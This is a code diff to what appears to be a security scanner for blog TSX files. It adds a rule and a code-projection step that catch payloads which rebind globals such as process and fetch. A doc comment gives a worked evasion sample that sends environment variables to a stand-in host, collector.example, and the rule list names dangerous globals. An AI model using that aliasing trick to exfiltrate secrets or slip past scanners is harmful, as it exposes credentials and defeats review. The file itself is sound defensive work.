@@ -124,6 +124,107 @@ function callForms(name) {
 }
 
 /**
+ * The globals a payload needs, matched as BINDINGS rather than as call sites.
+ *
+ * Every rule above keys on the identifier being immediately followed by `(`,
+ * `.` or `[`. Rebinding it first defeats all of them, with no obfuscation and
+ * no cleverness:
+ *
+ *     const { env } = process        // `process` in trailing position
+ *     const send = fetch             // no paren after `fetch`
+ *     await send("https://collector.example/i", { body: JSON.stringify(env) })
+ *
+ * That scanned clean and exited 0 while the byte-identical payload written as
+ * `process.env` + `fetch(` exited 1 — a fail-open in the one place this check
+ * claims to work, found by an adversarial review that reproduced it. Both
+ * constructs are also idiomatic TS a model would write unprompted, so it could
+ * fail open by accident and not only under attack.
+ *
+ * The forms below are the ones prose cannot produce: an identifier on the right
+ * of `=`, `=>`, `return` or `...`, or sitting alone as an argument or an object
+ * value. "The closing process," survives; `= process` does not. They are also
+ * matched against the CODE PROJECTION (see projectCode) rather than the raw
+ * text, so an article that happens to discuss the "escrow process" in a
+ * sentence is not a finding.
+ */
+const ALIASABLE = [
+  'process',
+  'fetch',
+  'require',
+  'eval',
+  'Function',
+  'globalThis',
+  'Buffer',
+  'atob',
+  'btoa',
+  'XMLHttpRequest',
+  'WebSocket',
+  'child_process',
+  '__dirname',
+  '__filename',
+]
+
+function bindingForms(name) {
+  return [
+    // `= process` · `=> fetch` · `return require` · `...process`
+    new RegExp(`(?:=>|=|\\breturn|\\.\\.\\.)\\s*\\b${name}\\b`),
+    // `f(process)` · `[fetch, x]` · `{ k: process }` — the identifier standing
+    // alone as a value, with a closing delimiter after it.
+    new RegExp(`[(,\\[:]\\s*\\b${name}\\b\\s*(?=[),\\]}])`),
+  ]
+}
+
+/**
+ * Reduce a TSX module to the parts that are code, so the binding rules above
+ * can match aggressively without tripping on an article that uses one of these
+ * words in a sentence.
+ *
+ * Two removals, both conservative:
+ *
+ *   1. Comments. `//` only when it is not the `//` of a URL scheme.
+ *   2. JSX text. A span between `>` and `<` containing neither `<` nor `>` is
+ *      the text of an element. Brace expressions inside it are kept — that is
+ *      where `{fetch("…")}` would live — and everything else in the span is
+ *      dropped as prose.
+ *
+ * String literals are deliberately NOT stripped: a naive scanner would read the
+ * apostrophe in "don't" as opening one and swallow the rest of the file, which
+ * is a fail-open. Leaving them in can only produce a false POSITIVE, and the
+ * binding forms need JS punctuation that prose inside a string does not have.
+ *
+ * This is a projection, not a parse. It exists to lower false positives on a
+ * high-signal rule, not to be a security boundary of its own.
+ */
+function projectCode(raw) {
+  let out = raw.replace(/\/\*[\s\S]*?\*\//g, ' ')
+  out = out.replace(/(^|[^:])\/\/[^\n]*/g, '$1 ')
+  out = out.replace(/>([^<>]*)</g, (_m, inner) => {
+    if (!inner.includes('{')) return '><'
+    // Keep balanced brace regions; drop the prose around them.
+    const kept = []
+    let depth = 0
+    let start = -1
+    for (let i = 0; i < inner.length; i += 1) {
+      const ch = inner[i]
+      if (ch === '{') {
+        if (depth === 0) start = i
+        depth += 1
+      } else if (ch === '}') {
+        depth -= 1
+        if (depth === 0 && start !== -1) {
+          kept.push(inner.slice(start, i + 1))
+          start = -1
+        }
+        if (depth < 0) depth = 0
+      }
+    }
+    if (depth > 0 && start !== -1) kept.push(inner.slice(start))
+    return `>${kept.join(' ')}<`
+  })
+  return out
+}
+
+/**
  * Each rule: what it catches, and why a blog post has no reason to contain it.
  * Order is severity-ish; all of them fail the check.
  */
@@ -170,6 +271,13 @@ const RULES = [
     id: 'encoding-obfuscation',
     why: 'used to hide a payload from exactly this kind of scan',
     patterns: [/\bBuffer\s*\??\s*\.\s*from\b/, ...callForms('atob'), ...callForms('btoa'), /\bString\s*\??\s*\.\s*fromCharCode\b/],
+  },
+  {
+    id: 'aliased-global',
+    why: 'rebinds a build-time global to a local name, which is how a payload reaches process.env or fetch without ever writing `process.env` or `fetch(`',
+    // Matched against the code projection, not the raw text — see projectCode.
+    source: 'code',
+    patterns: ALIASABLE.flatMap(bindingForms),
   },
 ]
 
@@ -247,14 +355,31 @@ for (const rel of args) {
   // more false-positive-prone of the two.
   const dense = raw.replace(/\s+/g, '')
 
+  // Same two passes over the code projection, for rules that would be too
+  // false-positive-prone against prose. Line numbers still line up: projectCode
+  // only ever replaces characters with spaces or drops text inside a line, and
+  // the JSX-text pass leaves the newlines it does not touch in place.
+  const code = projectCode(raw)
+  const codeLines = code.split(/\r?\n/)
+  const codeDense = code.replace(/\s+/g, '')
+
   scanned.push(rel)
 
   for (const rule of RULES) {
+    const useCode = rule.source === 'code'
+    const hay = useCode ? codeLines : lines
+    const denseHay = useCode ? codeDense : dense
     let hitInPass1 = false
-    for (let i = 0; i < lines.length; i += 1) {
+    for (let i = 0; i < hay.length; i += 1) {
       for (const re of rule.patterns) {
-        if (re.test(lines[i])) {
-          findings.push({ rel, line: i + 1, rule, snippet: lines[i].trim().slice(0, 160), pass: 'line' })
+        if (re.test(hay[i])) {
+          findings.push({
+            rel,
+            line: i + 1,
+            rule,
+            snippet: (lines[i] ?? hay[i]).trim().slice(0, 160),
+            pass: 'line',
+          })
           hitInPass1 = true
           break
         }
@@ -262,7 +387,7 @@ for (const rel of args) {
     }
     if (hitInPass1) continue
     for (const re of rule.patterns) {
-      if (re.test(dense)) {
+      if (re.test(denseHay)) {
         findings.push({ rel, line: null, rule, snippet: '(token split across lines/whitespace)', pass: 'dense' })
         break
       }
